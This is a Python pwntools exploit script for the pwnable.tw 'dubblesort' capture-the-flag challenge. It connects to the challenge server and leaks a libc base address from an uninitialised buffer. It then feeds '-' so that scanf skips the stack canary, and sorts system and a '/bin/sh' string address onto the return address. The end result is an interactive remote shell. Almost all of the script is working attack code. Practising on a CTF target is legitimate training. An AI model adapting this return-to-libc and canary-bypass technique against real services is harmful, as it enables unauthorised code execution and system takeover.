#!/usr/bin/env python
import re
from pwn import *
import pwnlib.shellcraft
# import pwnlib.filepointer


libc = ELF('./libc_32.so.6')
debug = False

c = 0
if debug:
    pwn_file="./ld-2.23.so --library-path ./ ./dubblesort"
    c = process(pwn_file.split(), env={'LD_PRELOAD': './libc_32.so.6'})
    print(c.libs())
else:
    c = remote('chall.pwnable.tw', 10101)

context.os='linux'
context.terminal = ['tmux', 'splitw', '-h']

if debug:
    gdbcmd = '''source /usr/share/peda/peda.py
    file ./dubblesort
    info proc mappings
    set $elf_base={}
    s
    b *$elf_base+0xb17
    c
    bt
    '''.format(hex(c.libs()[c.cwd + c.argv[3].decode().strip('.')]))
    gdb.attach(c, gdbcmd)
context.log_level ='debug'

def send_menuln(command):
    c.recvuntil(':')
    c.sendline(command)


def send_menu(command):
    c.recvuntil(':')
    c.send(command)


#send_menu('\xff' * (64))
# leak libc
# note: different distro has different leak location

# coune = 1 + 2 * 4 # arch
count = 1 + 6 * 4 # ubuntu
send_menu('A' * count)
c.recvuntil('A' * count)
libc_base =  u32(b'\00' + c.recvn(3)) - (0xeff000 - 0xd4f000)
libc.address = libc_base
print(hex(libc_base))

# layout shellcode
send_menuln(str(24 + 1 + 7 + 2 + 3))
for i in range(24):
    send_menuln('0')

send_menuln('-') # canary

# padding
for i in range(7):
    send_menuln(str(libc.symbols['system']))

# system
for i in range(2):
    send_menuln(str(libc.symbols['system']))

# sh
send_menuln(str(libc_base + 0x001562e5+16))
send_menuln(str(libc_base + 0x001562e5+16))
send_menuln(str(libc_base + 0x001562e5+16))

print('system')
print(hex(libc.symbols['system']))

c.interactive()
c.close()

